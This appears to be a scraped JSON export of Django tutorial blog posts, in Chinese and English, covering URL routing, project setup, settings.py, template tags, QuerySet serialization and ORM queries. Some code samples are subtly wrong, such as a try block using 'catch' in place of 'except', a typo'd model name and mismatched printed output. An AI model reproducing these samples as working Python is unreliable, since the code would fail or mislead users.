views.a，这时候，你就需要 ^了，^ 表示匹配输入字符串的开始位置，即 IP和端口之后的字符串。 1234urlpatterns = [ url(r'^a/$', views.a), url(r'^a/b$', views.b),] 这样，有且仅有在端口之后、querysting 之前为 a/ 的 URL 才能被匹配到 views.a ，即http://127.0.0.1:8001/a/，而http://127.0.0.1:8001/sa/显然不能。 总结我们推荐在所有路由规则中，均加上^和$，以帮助精确匹配。 一些正则在Python 正则表达式中，命名正则表达式组的语法是(?P&lt;name&gt;pattern)，其中name 是组的名称，pattern 是要匹配的模式。 ExampleHere’s a sample URLconf: 12345678910from django.urls import pathfrom . import viewsurlpatterns = [ path('articles/2003/', views.special_case_2003), path('articles/&lt;int:year&gt;/', views.year_archive), path('articles/&lt;int:year&gt;/&lt;int:month&gt;/', views.month_archive), path('articles/&lt;int:year&gt;/&lt;int:month&gt;/&lt;slug:slug&gt;/', views.article_detail),] Notes: To capture a value from the URL, use angle brackets. Captured values can optionally include a converter type. For example, use &lt;int:name&gt; to capture an integer parameter. If a converter isn’t included, any string, excluding a / character, is matched. There’s no need to add a leading slash, because every URL has that. For example, it’s articles, not /articles. Example requests: A request to /articles/2005/03/ would match the third entry in the list. Django would call the function views.month_archive(request, year=2005, month=3). /articles/2003/ would match the first pattern in the list, not the second one, because the patterns are tested in order, and the first one is the first test to pass. Feel free to exploit the ordering to insert special cases like this. Here, Django would call the function views.special_case_2003(request) /articles/2003 would not match any of these patterns, because each pattern requires that the URL end with a slash. /articles/2003/03/building-a-django-site/ would match the final pattern. Django would call the function views.article_detail(request, year=2003, month=3, slug=&quot;building-a-django-site&quot;). Reference https://docs.djangoproject.com/en/2.2/topics/http/urls/ https://blog.csdn.net/lht_521/article/details/80580118","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django 创建 Django 项目或应用","date":"2019-11-10T09:01:15.000Z","path":"2019/11/10/【Django】Django-创建-Django-项目或应用/","text":"Install Django1$ pip install django Creating a project1$ django-admin startproject mysite Start the Project1$ python manage.py runserver You’ll see the following output on the command line: If you want to change the server’s port, pass it as a command-line argument. For instance, this command starts the server on port 8080: 1$ python manage.py runserver 8080 If you want to change the server’s IP, pass it along with the port. For example, to listen on all available public IPs (which is useful if you are running Vagrant or want to show off your work on other computers on the network), use: Create a app in a project1$ python manage.py startapp &#123;project name&#125; 查看Django项目的目录结构切换终端到项目所属目录，使用tree命令可以查看项目结构 mac安装tree: brew installubuntu安装tree: sudo apt-get install treecentos安装tree: sudo yum -y install tree 执行 「tree + 项目名」 目录说明1、djangoDemo/djangoDemo: 项目最初的Python包 2、djangoDemo/init.py: 一个空文件，声明所在目录的包为一个Python包 3、djangoDemo/settings.py: 管理项目的配置信息 4、djangoDemo/urls.py: 声明请求url的映射关系 5、djangoDemo/wsgi.py: python程序和web服务器的通信协议 6、manage.py： 一个命令行工具，用来和Django项目进行交互，如前面创建项目就用到了该文件。 项目配置文件 - setting.pysetting.py 文件用来配置整个项目，里面的字段非常多，所以在开始之前有必要先都了解一下默认的配置有哪些 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import os# 项目的相对路径，启动服务的时候会运行这个文件所在路径的manage.pyBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# 安全密钥SECRET_KEY = 'l&amp;!v_npes(!j82+x(44vt+h&amp;#ag7io2x&amp;shnf*9^8fv0d63!0r'# 是否开启DebugDEBUG = True# 允许访问的主机ip，可以用通配符*ALLOWED_HOSTS = []# Application definition# 用来注册App 前6个是django自带的应用INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles',]# 中间件 ,需要加载的中间件。比如在请求前和响应后根据规则去执行某些代码的方法MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware',]# 指定URL列表文件 父级URL配置ROOT_URLCONF = 'djangoDemo.urls'# 加载网页模板路径TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,]# WSGI的配置文件路径WSGI_APPLICATION = 'djangoDemo.wsgi.application'# 数据库配置 默认的数据库为sqliteDATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), &#125;&#125;# 相关密码验证AUTH_PASSWORD_VALIDATORS = [ &#123; 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', &#125;, &#123; 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', &#125;, &#123; 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', &#125;, &#123; 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', &#125;,]# 语言设置 默认英语， 中文是zh-hansLANGUAGE_CODE = 'en-us'# 时区设置，中国的是：Asia/ShanghaiTIME_ZONE = 'UTC'# i18n字符集是否支持USE_I18N = TrueUSE_L10N = True# 是否使用timezone# 保证存储到数据库中的是 UTC 时间；# 在函数之间传递时间参数时，确保时间已经转换成 UTC 时间；USE_TZ = True# 静态文件路径STATIC_URL = '/static/' Django Exception https://docs.djangoproject.com/en/2.2/ref/exceptions/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】template - 插入 Python 代码","date":"2019-11-10T08:53:16.000Z","path":"2019/11/10/【Django】template-插入-Python-代码/","text":"if/else 标签基本语法格式如下： 123&#123;% if condition %&#125; ... display&#123;% endif %&#125; 或者： 1234567&#123;% if condition1 %&#125; ... display 1&#123;% elif condiiton2 %&#125; ... display 2&#123;% else %&#125; ... display 3&#123;% endif %&#125; 根据条件判断是否输出。if/else 支持嵌套。 Note：模板标签中的变量是不需要用 {{ 来包裹的。 and、or 或not{% if %} 标签接受 and ， or 或者 not 关键字来对多个变量做判断 ，或者对变量取反（not)，例如： 123&#123;% if athlete_list and coach_list %&#125; athletes 和 coaches 变量都是可用的。&#123;% endif %&#125; 注意，{% if %} 标签不允许在同一个标签中同时使用 and 和 or ，因为逻辑上可能模糊的，这样的代码是不合法的： 1&#123;% if athlete_list and coach_list or cheerleader_list %&#125; 系统不支持用圆括号来组合比较操作。 如果你确实需要用到圆括号来组合表达你的逻辑式，考虑将它移到模板之外处理，然后以模板变量的形式传入结果吧。 或者，仅仅用嵌套的 {% if %} 标签替换 for 标签常规用法{% for %} 允许我们在一个序列上迭代。与Python的 for 语句的情形类似，循环语法是 for X in Y ，Y是要迭代的序列而X是在每一个特定的循环中使用的变量名称。 每一次循环中，模板系统会渲染在 {% for %} 和 {% endfor %} 之间的所有内容。 例如，给定一个运动员列表 athlete_list 变量，我们可以使用下面的代码来显示这个列表： 12345&lt;ul&gt;&#123;% for athlete in athlete_list %&#125; &lt;li&gt;&#123;&#123; athlete.name &#125;&#125;&lt;/li&gt;&#123;% endfor %&#125;&lt;/ul&gt; 反向迭代给标签增加一个 reversed 使得该列表被反向迭代： 1&#123;% for athlete in athlete_list reversed %&#125; 嵌套使用 {% for %}可以嵌套使用 {% for %} 标签。 在执行循环之前先检测列表的大小是一个通常的做法，当列表为空时输出一些特别的提示。for 标签支持一个可选的 {% empty %} 分句，通过它我们可以定义当列表为空时的输出内容。 下面的例子与用if-else实现等价： 12345&#123;% for athlete in athlete_list %&#125; &lt;p&gt;&#123;&#123; athlete.name &#125;&#125;&lt;/p&gt;&#123;% empty %&#125; &lt;p&gt;There are no athletes. Only computer programmers.&lt;/p&gt;&#123;% endfor %&#125; Django不支持退出循环操作。 如果我们想退出循环，可以改变正在迭代的变量，让其仅仅包含需要迭代的项目。 同理，Django也不支持continue语句，我们无法让当前迭代操作跳回到循环头部。 执行次数的整数计数器在每个 {% for %} 循环里有一个称为forloop 的模板变量。这个变量有一些提示循环进度信息的属性。 forloop.counter 总是一个表示当前循环的执行次数的整数计数器。 这个计数器是从1开始的，所以在第一次循环时forloop.counter 将会被设置为1。 123&#123;% for item in todo_list %&#125; &lt;p&gt;&#123;&#123; forloop.counter &#125;&#125;: &#123;&#123; item &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; Reference https://docs.djangoproject.com/en/2.2/topics/http/urls/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - QuerySet 序列化","date":"2019-11-10T08:45:24.000Z","path":"2019/11/10/【Django】Django-ORM-QuerySet-序列化/","text":"最完美的方法解决： ‘dict’ object has no attribute ‘_meta’ Queryset is not JSON serializable 1234users = models.User.objects.values(*USER_FIELDS).filter(**filter)[start_index:start_index + limit]if type(resp) is not list: resp = list(resp)return HttpResponse(json.dumps(resp, indent=2, cls=DjangoJSONEncoder), content_type=\"application/json\") Django 文档中提供的序列化方法123users = models.User.objects.filter(**filter)[start_index:start_index + 5]data = serializers.serialize('json', users, fields=(\"id\", \"name\", \"join_time\", \"last_login_time\", \"type\"))return HttpResponse(data, content_type=\"application/json\") 所有数据12from django.core import serializersdata = serializers.serialize(\"xml\", SomeModel.objects.all()) 部分数据12from django.core import serializersdata = serializers.serialize('xml', SomeModel.objects.all(), fields=('name','size')) 使用 json.dumps 序列化123users = models.User.objects.values(\"id\", \"name\", \"join_time\", \"last_login_time\", \"type\").filter(**filter)[start_index:start_index + 5]a = json.dumps(list(users), cls=DjangoJSONEncoder)return HttpResponse(a, content_type=\"application/json\") 可能的报错1 ‘dict’ object has no attribute ‘_meta’Context12queryset = myModel.objects.filter(foo_icontains=bar).values('f1', 'f2', 'f3')serialized_q = serializers.serialize('json', queryset, ensure_ascii=False) Solution1Django serializers can only serialize queryset, values() does not return queryset rather ValuesQuerySet object. So, avoid using values(). Rather, specifiy the fields you wish to use in values(), in the serialize method as follows: 12objectQuerySet = ConventionCard.objects.filter(ownerUser = user)data = serializers.serialize('json', list(objectQuerySet), fields=('fileName','id')) Instead of using objectQuerySet.values(&#39;fileName&#39;,&#39;id&#39;), specify those fields using the fields parameter of serializers.serialize() as shown above. Solution2Make list from objectQuerySet: 12data_ready_for_json = list( ConventionCard.objects.filter(ownerUser = user).values('fileName','id') )serialized_q = serializers.serialize('json', data_ready_for_json, ensure_ascii=False) 2 &lt;type ‘tuple’&gt;: (‘datetime.datetime(2017, 6, 15, 0, 0, tzinfo=&lt;UTC&gt;) is not JSON serializable’,)Context123views.pyusers = models.User.objects.values(\"name\",\"last_login_time\").filter(**filter)[start_index:start_index + limit]return HttpResponse(json.dumps(list(users), indent=2, cls=DjangoJSONEncoder), content_type=\"application/json\") 12345models.pyclass User(models.Model): name = models.CharField(max_length=20, unique=True,db_index=True) password = models.CharField(max_length=256) last_login_time = models.DateTimeField(null=True,blank=True) 可以看到，User 这个 model 的 last_login_time 域类型为DateTimeField。而当使用json.dumps进行序列化时，model 中有域的类型为DateTimeField时，就会出现datetime.datetime(...) is not JSON serializable 的错误。 Reference Serializing Django objects - https://docs.djangoproject.com/en/2.2/topics/serialization/ http://www.yihaomen.com/article/python/279.htm https://cloud.tencent.com/developer/ask/79587 https://stackoverflow.com/questions/30243101/return-queryset-as-json?noredirect=1&amp;lq=1 https://stackoverflow.com/questions/15874233/output-django-queryset-as-json","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - 查询数据","date":"2019-11-10T08:20:35.000Z","path":"2019/11/10/【Django】Django-ORM-查询数据/","text":"exclude()Calling filter() again on a queryset clones it and adds new parameters with an AND operator. Note that multiple keyword parameters can be specified in a single function call. Conversely, exclude() clones a queryset and adds any new parameters with an AND NOT operator: 123456&gt;&gt;&gt; queryset = Employee.objects.filter(first_name=\"Roger\", age=27)&gt;&gt;&gt; queryset2 = queryset.filter(last_name=\"Jolly\")&gt;&gt;&gt; queryset3 = queryset.exclude(last_name=\"Jolly\")&gt;&gt;&gt; any(employee.first_name != \"Roger\" for employee in queryset2)False&gt;&gt;&gt; any(employee.last_name != \"Jolly\" for employee in queryset2)False&gt;&gt;&gt; all(employee.last_name != \"Jolly\" for employee in queryset3)True To retrieve all objects in the table with no parameters, use the all() function instead of filter(). all() can also be used to create a clone of an existing queryset (more on this later). Iterating through querysets exposes the query results as instances of the associated Model. Handling Foreign KeysThe fields of other models referred to in foreign key relationships can be referred to within querysets. Simply use double underscores to indicate a remote property to be queried: 12# SELECT * FROM Dog INNER JOIN owner_tab ON (dog_tab.owner_id = owner_tab.id) WHERE dog_tab.name = \"Yoko\" AND owner.name = \"Taro\"&gt;&gt;&gt; queryset = Dog.objects.filter(name=\"Yoko\", owner__name=\"Taro\") Doing this will usually perform a JOIN operation in MySQL. The one exception is referring to the primary key of the related model. 12# SELECT * FROM Dog WHERE name = \"Yoko\" AND owner_id = 7&gt;&gt;&gt; queryset = Dog.objects.filter(name=\"Yoko\", owner__id=7)&gt;&gt;&gt; queryset = Dog.objects.filter(name=\"Yoko\", owner__pk=7) Query Parameter SuffixesApart from foreign key suffixes, Django also supports fixed-name suffixes to query parameters for specific types of checks. The table below lists all of them: Suffix MySQL equivalent Notes __gt, __gte, __lt, __lte &gt;, &gt;=, &lt;, &lt;= Limited to numerical types, dates and datetimes __exact = ‘value’ Acts the same as a regular query parameter. __iexact LIKE ‘value’ Case insensitive. __startswith LIKE BINARY ‘value%’ __istartswith LIKE ‘value%’ Case insensitive. __endswith LIKE BINARY ‘%value’ __iendswith LIKE ‘%value’ Case insensitive. __contains LIKE BINARY ‘%value%’ __icontains LIKE ‘%value%’ Case insensitive. __range BETWEEN first_value AND second_value Requires a tuple of two values to compare. This range test is inclusive.Can be used for numbers, dates/datetimes, and even characters. __year EXTRACT(YEAR FROM field_name) = value For dates and datetimes. __month EXTRACT(MONTH FROM field_name) = value For dates and datetimes. __day EXTRACT(DAY FROM field_name) = value For dates and datetimes. __week_day DAYOFWEEK(field_name) = value For dates and datetimes. __hour EXTRACT(HOUR FROM field_name) = value For datetimes. __minute EXTRACT(MINUTE FROM field_name) = value For datetimes. __second EXTRACT(SECOND FROM field_name) = value For datetimes. __isnull IS NULL, IS NOT NULL Accepts a boolean. __search MATCH (field_name) AGAINST (‘value’ IN BOOLEAN MODE) Only supported by MySQL 5.6+, and for columns that have been set up properly.Refer to the documentation for details. __regex REGEXP BINARY ‘value’ __iregex REGEXP ‘value’ The following examples illustrate their usage: 123Employee.objects.filter(name__istartswith=\"Josh\", age__lte=35)Employee.objects.filter(age__range=(20, 25), hire_date__year=2018)Employee.objects.filter(last_name__isnull=True) get()get() can be used as a shortcut to retrieve the first element of a queryset. The following statements are equivalent: 123employee = Employee.objects.filter(first_name=\"Jolly\", last_name=\"Rogers\")[0]employee = Employee.objects.get(first_name=\"Jolly\", last_name=\"Rogers\")employee = Employee.objects.filter(first_name=\"Jolly\").get(last_name=\"Rogers\") Naturally, if there are no results from the query, these statements will also raise an exception. However, get() will raise a DoesNotExist exception, which looks more readable when caught. get() can also raise a MultipleObjectsReturned exception if there are multiple possible results from the query: 12345678try: employee = Employee.objects.get(first_name=\"Jolly\", last_name=\"Rogers\")catch Employee.DoesNotExist: employee = None logger.debug(\"Employee not found!\")catch Employee.MultipleObjectsReturned: logger.debug(\"Query too vague, more than one result!\") raise Exception(\"Query too vague!\") A much easier way of retrieving a single result is to use the first() function instead. However, this will also not raise MultipleObjectsReturned, as first() simply retrieves the first item, and the uniqueness of the model instance returned cannot be assumed. Here’s an example with a query that returns no result: 12&gt;&gt;&gt; employee = Employee.objects.filter(first_name=\"Jolly\", last_name=\"Rogers\").first()&gt;&gt;&gt; employeeNone Limiting QueriesThe result of a queryset can be limited through Python slicing operators. 12345# LIMIT 10Employee.objects.filter(first_name=\"Jolly\", age=25)[:10]# OFFSET 25Employee.objects.all()[25:]# OFFSET 23 LIMIT 34Employee.objects.exclude(last_name=\"Rogers\")[23:57] Similar to filter(), slicing will create a clone of the queryset, but this sliced clone will not accept additional filter parameters. Using Different OperatorsAlthough filter() and exclude() can cover simple AND queries, this does not cover the full spectrum of possible queries. Thus, Django provides the Q (query) object, to allow for more complex queries. The Q object simply takes in the same arguments as the filter(), exclude() and get() functions, and must be supplied within one of the three functions to be applied to a query. This also means, by extension, the Q object can be supplied with an instance of itself. Q objects can be used along with the bit-wise operators &amp; (AND), | (OR) and ~ (NOT) to construct complex queries. Each operation returns a new Q object. The following statements illustrate how Q objects can be used along with the bit-wise operators to construct equivalent queries in MySQL: 12345678from django.db.models import Q # SELECT * FROM employee_tab WHERE first_name = \"Jolly\" AND age = 25Employee.objects.filter(Q(first_name=\"Jolly\", age=25))Employee.objects.filter(Q(first_name=\"Jolly\") &amp; Q(age=25))# SELECT * FROM employee_tab WHERE first_name = \"Jolly\" OR NOT age = 25Employee.objects.filter(Q(first_name=\"Jolly\") | ~Q(age=25))# SELECT * FROM employee_tab WHERE first_name = \"Jolly\" AND NOT (last_name = \"Roger\" OR (last_name = \"Anderson\" AND age = 30))Employee.objects.filter(Q(first_name=\"Jolly\") &amp; ~Q(Q(last_name=\"Roger\") | Q(last_name=\"Anderson\", age=30)) Self-referencing FieldsSometimes you need a query that can refer to the value in another column of the same row. Django provides the F (field) object for this purpose. Use the F object to refer to the name of another column instead of providing the value directly: 12345from django.db.models import F # SELECT * FROM employee_tab WHERE first_name = \"last_name\"Employee.objects.filter(first_name=\"last_name\")# SELECT * FROM employee_tab WHERE first_name = last_nameEmployee.objects.filter(first_name=F(\"last_name\")) Limiting the Columns ReturnedTo limit the performance overhead on the application server (both network load and memory usage), it’s possible for Django to limit the data it retrieves. The recommended way is to use the values() or values_list() functions. Both of these return modified clones of the queryset, with unique behavior when iterated over. values() returns dictionaries when the queryset is iterated over, containing the keys specified, as well as their respective values for each object instance. values_list() returns tuples when the queryset is iterated over, containing the values of the keys specified in the order given for each object instance. Additionally, if only a single key is specified, an optional flat keyword argument can be given. If flat is set to True, the values will be flattened instead of being wrapped in iterables. Naturally, attempting this with multiple keys is an error. 123456789&gt;&gt;&gt; employee_values = Employee.objects.filter(first_name=\"Charlie\").values(\"first_name\", \"age\")&gt;&gt;&gt; list(employee_values)[&#123;u\"first_name\": Charlie, u\"age\": 25&#125;, &#123;u\"first_name\": Charlie, u\"age\": 21&#125;, &#123;u\"first_name\": Charlie, u\"age\": 35&#125;, ...]&gt;&gt;&gt; employee_values_list = Employee.objects.filter(last_name=\"Johnson\").values_list(\"last_name\", \"first_name\")&gt;&gt;&gt; list(employee_values_list)[(\"Johnson\", \"Robert\"), (\"Johnson\", \"Charlie\"), ...]&gt;&gt;&gt; employee_values_list_flat = Employee.objects.filter(last_name=\"Johnson\").values_list(\"age\", flat=True)&gt;&gt;&gt; list(employee_values_list_flat)[26, 42, 31, ...] values and values_list need not necessarily be the last function in the chain, as the cloned queryset they return will still expose most functions, such as filter, as well as slicing. 指定过滤条件（where）获取一行1post = Post.objects.get(title=\"Sample title\") 获取所有行12all_entries = eporter.objects.all()&lt;QuerySet [...]&gt; 获取满足条件的所有行12Post.objects.filter(published_date__lte=timezone.now())&lt;QuerySet [...]&gt; 获取满足条件的前 N 行12Post.objects.filter(published_date__lte=timezone.now())[0:2]&lt;QuerySet [...]&gt; 这里是获取了第 1、2 行。python 指定列名来提取数据指定一个字段（列） - values12&gt;&gt;&gt; empList = Employee.objects.values(\"id\")&lt;QuerySet [&#123;'id': 1&#125;, &#123;'id': 10&#125;, &#123;'id': 100&#125;, &#123;'id': 11&#125;, &#123;'id': 12&#125;, &#123;'id': 13&#125;, &#123;'id': 14&#125;, &#123;'id': 15&#125;, &#123;'id': 16&#125;, &#123;'id': 17&#125;, &#123;'id': 18&#125;, &#123;'id': 19&#125;, &#123;'id': 2&#125;, &#123;'id': 20&#125;, &#123;'id': 21&#125;, &#123;'id': 22&#125;, &#123;'id': 23&#125;, &#123;'id': 24&#125;, &#123;'id': 25&#125;, &#123;'id': 26&#125;, '......']&gt; 只要第一条数据 - values12&gt;&gt;&gt; empList = Employee.objects.values(\"id\").first()&#123;dict&#125; &#123;'id': 1&#125; 只要第一条数据 - values12&gt;&gt;&gt; empList = Employee.objects.values_list(\"IP\").first()&#123;tuple&#125; ('192.168.1.111',) 只要特定数量的数据 - values12&gt;&gt;&gt; empList = Employee.objects.values(\"id\")[0:2]&lt;QuerySet [&#123;'id': 1&#125;, &#123;'id': 10&#125;&gt; 只要特定数量的数据 - values_list123456789ipList = EmployeeIP.objects.values_list(\"IP\")[0:2]print(type(ipList))# &lt;class 'django.db.models.query.QuerySet'&gt;print(ipList)# [('192.168.1.41',), ('192.168.1.44',)]print(type(ipList[0]))# &lt;class 'tuple' &gt;print(ipList[0])# 192.168.1.111 合并数据 - values_list，flat=True相当于合并列数据到一个list 中： 123456789ipList = EmployeeIP.objects.values_list(\"IP\",flat=True)[0:2]print(type(ipList))# &lt;class 'django.db.models.query.QuerySet'&gt;print(ipList)# ['192.168.1.41','192.168.1.44']print(type(ipList[0]))# &lt;class 'str' &gt;print(ipList[0])# 192.168.1.111 指定多个字段 - values12345678&gt;&gt;&gt; empList = Employee.objects.values(\"first_name\", \"last_name\", \"email\")&gt;&gt;&gt; print(type(empList))# &lt;class 'django.db.models.query.QuerySet'&gt;&gt;&gt;&gt; print(empList)# [# &#123;'last_name': 'Wei', 'first_name': 'Vena', 'email': 'Vena@test.com'&#125;,# &#123;'last_name': 'Wan', 'first_name': 'Mark', 'email': 'mwan@test.com'&#125;# ] values() 与 values_list()values()12&gt;&gt;&gt; empList = Employee.objects.values(\"id\")[0:2]&lt;QuerySet [&#123;'id': 1&#125;, &#123;'id': 10&#125;&gt; 调用 values() 时，对于结果集中的每一行，都用一个 dict 来表示。 values_list()123456789ipList = EmployeeIP.objects.values_list(\"IP\")[0:2]print(type(ipList))# &lt;class 'django.db.models.query.QuerySet'&gt;print(ipList)# [('192.168.1.41',), ('192.168.1.44',)]print(type(ipList[0]))# &lt;class 'tuple' &gt;print(ipList[0])# 192.168.1.111 调用 values_list() 时，对于结果集中的每一行，都用一个 tuple 来表示。 同时，可以增加flat=True参数，返回某个字段的列表，例子如下： 1Case_images.objects.filter(case=case_id).order_by('-created_time').values_list('url',flat=True) 总结 values() 单条记录 - &lt;class &#39;dict&#39;&gt; 多条记录 - &lt;class &#39;django.db.models.query.QuerySet&#39;&gt; values_list() 单条记录 - &lt;class &#39;tuple&#39;&gt; 多条记录 - &lt;class &#39;django.db.models.query.QuerySet&#39;&gt; Reference django获取指定列的数据 - https://www.cnblogs.com/wancy86/p/django_getfield.html","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Django】Django ORM - CRUD","date":"2019-11-10T08:02:18.000Z","path":"2019/11/10/【Django】Django-ORM-CRUD/","text":"RetrieveRetrieving Objects - get()To retrieve objects from your database, construct a QuerySet via a Manager on your model class. A QuerySet represents a collection of objects from your database. It can have zero, one or many filters. Filters narrow down the query results based on the given parameters. In SQL terms, a QuerySet equates to a SELECT statement, and a filter is a limiting clause such as WHERE or LIMIT. You get a QuerySet by using your model’s Manager. Each model has at least one Manager, and it’s called objects by default. Access it directly via the model class, like so: 12345678910# Import the models we created from our \"news\" app&gt;&gt;&gt; from news.models import Article, Reporter&gt;&gt;&gt; Blog.objects&lt;django.db.models.manager.Manager object at ...&gt;&gt;&gt;&gt; b = Blog(name='Foo', tagline='Bar')&gt;&gt;&gt; b.objectsTraceback: ...AttributeError: \"Manager isn't accessible via Blog instances.\" get() raises MultipleObjectsReturned if more than one object was found. The MultipleObjectsReturned exception is an attribute of the model class. get() raises a DoesNotExist exception if an object wasn’t found for the given parameters. This exception is an attribute of the model class. Example: 1Entry.objects.get(id='foo') # raises Entry.DoesNotExist The DoesNotExist exception inherits from django.core.exceptions.ObjectDoesNotExist, so you can target multiple DoesNotExist exceptions. Example: 123456from django.core.exceptions import ObjectDoesNotExisttry: e = Entry.objects.get(id=3) b = Blog.objects.get(id=1)except ObjectDoesNotExist: print(\"Either the entry or blog doesn't exist.\") Retrieving all objectsThe simplest way to retrieve objects from a table is to get all of them. To do this, use the all() method on a Manager: 12&gt;&gt;&gt; all_entries = eporter.objects.all()&lt;QuerySet [...]&gt; The all() method returns a QuerySet of all the objects in the database. 筛选对象 - filter()filter()Returns a new QuerySet containing objects that match the given lookup parameters. The lookup parameters (**kwargs) should be in the format described in Field lookups below. Multiple parameters are joined via AND in the underlying SQL statement. If you need to execute more complex queries (for example, queries with OR statements), you can use Q objects. 1234567891011# Django provides a rich database lookup API.&gt;&gt;&gt; Reporter.objects.get(id=1)&lt;Reporter: John Smith&gt;&gt;&gt;&gt; Reporter.objects.get(full_name__startswith='John')&lt;Reporter: John Smith&gt;&gt;&gt;&gt; Reporter.objects.get(full_name__contains='mith')&lt;Reporter: John Smith&gt;&gt;&gt;&gt; Reporter.objects.get(id=2)Traceback (most recent call last): ...DoesNotExist: Reporter matching query does not exist. QuerySets的很大一部分功能是对它们进行筛选。 譬如，我们想要发现所有都由用户ola编写的文章。 我们将使用 filter，而不是 all 在 Post.objects.all()。 我们需要在括号中申明哪些条件，以在我们的 queryset 结果集中包含一篇博客文章。 在我们的情况是 author，它等于 me。 把它写在 Django 的方式是： author = me。 现在我们的代码段如下所示： 12&gt;&gt;&gt; Post.objects.filter(author=me)&lt;QuerySet [&lt;Post: Sample title&gt;, &lt;Post: Post number 2&gt;, &lt;Post: My 3rd post!&gt;, &lt;Post: 4th title of post&gt;]&gt; 或者，也许我们想看到包含在 title 字段标题的所有帖子吗？ 12&gt;&gt;&gt; Post.objects.filter(title__contains='title')&lt;QuerySet [&lt;Post: Sample title&gt;, &lt;Post: 4th title of post&gt;]&gt; 注意，在title 与 contains 之间有两个下划线字符 (_)。 Django 的 ORM 使用此语法来分隔字段名称 （”title”） 和操作或筛选器 （”contains”）。 如果您只使用一个下划线，您将收到类似”FieldError： 无法解析关键字 title_contains”的错误。 你也可以获取一个所有已发布文章的列表。我们通过筛选所有含published_date为过去时间的文章来实现这个目的： 12&gt;&gt;&gt; from django.utils import timezone &gt;&gt;&gt; Post.objects.filter(published_date__lte=timezone.now())[] 过滤条件 __exact：精确等于， like ‘aaa’ __iexact：精确等于，忽略大小写，ilike ‘aaa’ __contains：包含， like ‘%aaa%’ __icontains：包含，忽略大小写，ilike ‘%aaa%’，但是对于sqlite来说，contains的作用效果等同于icontains。 __gt：大于 __gte：大于等于 __lt：小于 __lte：小于等于 __in：存在于一个list范围内 __startswith：以…开头 __istartswith：以…开头，忽略大小写 __endswith：以…结尾 __iendswith：以…结尾，忽略大小写 __range：在…范围内 __year：日期字段的年份 __month：日期字段的月份 __day：日期字段的日 __isnull：为True或者False Creating ObjectsTo represent database-table data in Python objects, Django uses an intuitive system: A model class represents a database table, and an instance of that class represents a particular record in the database table. To create an object, instantiate it using keyword arguments to the model class, then call save() to save it to the database. Assuming models live in a file mysite/blog/models.py, here’s an example: 1234567891011&gt;&gt;&gt; from news.models import Article, Reporter# Create a new Reporter.&gt;&gt;&gt; r = Reporter(full_name='John Smith')# Save the object into the database. You have to call save() explicitly.&gt;&gt;&gt; r.save()# Now it has an ID.&gt;&gt;&gt; r.id1 This performs an INSERT SQL statement behind the scenes. Django doesn’t hit the database until you explicitly call save(). The save() method has no return value. 总结增加一条数据其实有两种等价（equivalent）的方法。 方法 11&gt;&gt;&gt; Post.objects.create(author=me, title='Sample title', text='Test') 方法 212345# Create an article.&gt;&gt;&gt; from datetime import date&gt;&gt;&gt; a = Article(pub_date=date.today(), headline='Django is cool',... content='Yeah.', reporter=r)&gt;&gt;&gt; a.save() Update ObjectsUpdating and Deleting ResultsQuerysets can be used to update rows instead of retrieving them. Simply call update() on a normal (not sliced or specially altered) queryset. 12&gt;&gt;&gt; richards = Employee.objects.filter(first_name=\"Dick\", age__gte=20)&gt;&gt;&gt; richards.update(first_name=\"Richard\") The update() function will return the number of matched rows from the filter(). It does not necessarily represent the number of rows actually updated by the query, as it’s possible certain values already matched the new value in the update(). Deleting results uses a similar queryset API, which takes the form of the delete() function: 12&gt;&gt;&gt; richards = Employee.objects.filter(first_name=\"Dick\", age__gte=20)&gt;&gt;&gt; richards.delete() Unlike update(), delete() does not return anything. It is also the only queryset method to not be directly exposed in the manager (i.e. the objects attribute of a model). If you really want to clear out an entire table, you must use the following: 1&gt;&gt;&gt; Employee.objects.all().delete() Deleting is inherently a risky action (hence the inconvenient API), so do this with caution. 更新数据的两种方法假如我们的表结构是这样的 123class User(models.Model): username = models.CharField(max_length=255, unique=True, verbose_name='用户名') is_active = models.BooleanField(default=False, verbose_name='激活状态') 那么我们修改用户名和状态可以使用如下两种方法： 方法 11User.objects.filter(id=1).update(username='nick',is_active=True) 方法21234_t = 